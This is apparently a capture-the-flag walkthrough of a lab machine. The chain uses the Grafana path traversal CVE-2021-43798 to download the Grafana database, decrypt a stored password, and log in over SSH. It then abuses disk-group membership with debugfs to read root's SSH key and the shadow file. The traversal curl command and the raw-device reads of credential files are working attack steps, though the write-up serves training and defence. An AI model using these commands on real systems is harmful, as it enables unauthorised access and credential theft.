#Linux #Grafana #CVE #PathTraversal #SQLite #AESDecrypt #SSH #diskgroup #debugfs #infodisclosure

## Overview

Fantastic is a Linux box exposing Prometheus on port 9090 and Grafana on port 3000. Grafana 8.3.0 is vulnerable to CVE-2021-43798, a path traversal that allows unauthenticated download of the Grafana SQLite database. That database contains an AES-encrypted data source password for `sysadmin`, which a Go decryption script recovers. SSH access as `sysadmin` reveals membership in the `disk` group, enabling raw-disk reads via `debugfs`, used here to steal root's SSH private key and read the proof flag directly off the block device.

## Recon

### Nmap

```sh
PORT     STATE SERVICE
22/tcp   open  ssh
3000/tcp open  http    [Grafana]
9090/tcp open  http    [Prometheus]
```

Port 9090 runs Prometheus 2.32.1, useful for metrics enumeration but not directly exploitable here. Port 3000 is the main target.

### Grafana Version Identification

The Grafana login page at `http://192.168.229.181:3000/login` shows:

```
Grafana Version v.8.3.0 (914fcedb72)
```

Default credentials `admin:admin` do not work. The version identifies the vulnerability:

```
Grafana 8.x - Path Traversal (CVE-2021-43798)
https://www.exploit-db.com/exploits/50581
```

## Foothold

### Path Traversal, Dumping the Grafana Database

CVE-2021-43798 uses a directory traversal in the plugin API path to read arbitrary files. The automated exploit reads `/etc/passwd` to confirm:

```sh
python3 50581.py -H http://192.168.229.181:3000
Read file > /etc/passwd
```

The `/etc/passwd` output confirms `sysadmin` (uid=1001) and `prometheus` (uid=1000) as real users.

The more valuable target is the Grafana SQLite database itself, pulled with `curl`:

```sh
curl --path-as-is http://192.168.229.181:3000/public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db -o grafana.db
```

> **Why the plugin path enables traversal:** Grafana serves static plugin assets by appending the requested path to a base directory. The fix should canonicalize the path before serving, but versions before 8.3.1 fail to do this, so `../../../../` escapes the plugin root and reaches anywhere on the filesystem the Grafana process can read.

### Decrypting the Data Source Password

Opening `grafana.db` in a SQLite viewer, the `data_source` table contains:

```
sysadmin
{"basicAuthPassword":"anBneWFNQ2z+IDGhz3a7wxaqjimuglSXTeMvhbvsveZwVzreNJSw+hsV4w=="}
```

The password is AES-encrypted using a key derived from `grafana.ini`'s `secret_key`. A Go decryption script recovers it:

```sh
go run AESDecrypt.go
[*] grafanaIni_secretKey= SW2YcwTIb9zpOOhoPsMm
[*] DataSourcePassword= anBneWFNQ2z+IDGhz3a7wxaqjimuglSXTeMvhbvsveZwVzreNJSw+hsV4w==
[*] plainText= SuperSecureP@ssw0rd
```

Credentials:

```
sysadmin:SuperSecureP@ssw0rd
```

These do not work on the Grafana login panel but succeed over SSH:

```sh
ssh sysadmin@192.168.229.181
sysadmin@192.168.229.181's password: ‹redacted›

$ whoami
sysadmin
```

## Privilege Escalation

### disk Group → debugfs → Root

`id` reveals group membership that changes everything:

```sh
$ id
uid=1001(sysadmin) gid=1001(sysadmin) groups=1001(sysadmin),6(disk)
```

LinPEAS confirms: `sysadmin` is in the `disk` group (GID 6).

> **Why `disk` group membership equals root access:** members of the `disk` group get read/write access to raw block devices under `/dev`. The filesystem's permission model lives inside the filesystem. If you can read the raw block device that backs `/`, you can read any file on it, including `/etc/shadow`, SSH keys, and flags, regardless of file ownership or permissions. `debugfs` is a filesystem debugger that opens the block device directly, bypassing all OS-level access controls.

Find the root filesystem device:

```sh
$ df -h
/dev/sda2   9.8G  5.6G  3.7G  61%  /
```

Open `debugfs` against the device and read root's SSH private key:

```sh
debugfs /dev/sda2
debugfs:  cat root/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAA...
-----END OPENSSH PRIVATE KEY-----
```

Read the proof flag without ever becoming root in a shell:

```sh
debugfs:  cat /root/proof.txt
‹redacted›
```

The root hash from `/etc/shadow` was also recoverable this way:

```sh
root:$6$mAe2JsSJSmg1n45O$78rgk3B6HaklRIPcLOtwP9aX5i...
```

## Root

Root's SSH private key grants full shell access:

```sh
ssh root@192.168.229.181 -i root_id_rsa
root@fantastic:~# whoami
root
```

## Takeaways

- **CVE-2021-43798 gives unauthenticated database access.** No login required, just a crafted URL. The Grafana SQLite database contains every data source credential the instance has configured.
- **Grafana data source passwords use AES with a per-instance key stored in `grafana.ini`.** The path traversal leaks both the database and the ini file, making decryption deterministic once both files are obtained.
- **`id` is the first command after foothold.** `disk` group membership (along with `lxd`, `docker`, `adm`) is effectively root because it bypasses the filesystem permission layer entirely.
- **`debugfs` reads any file on the partition, including SSH keys and proof flags.** No root shell required, the flag can be read directly from the block device as a `disk` group member.
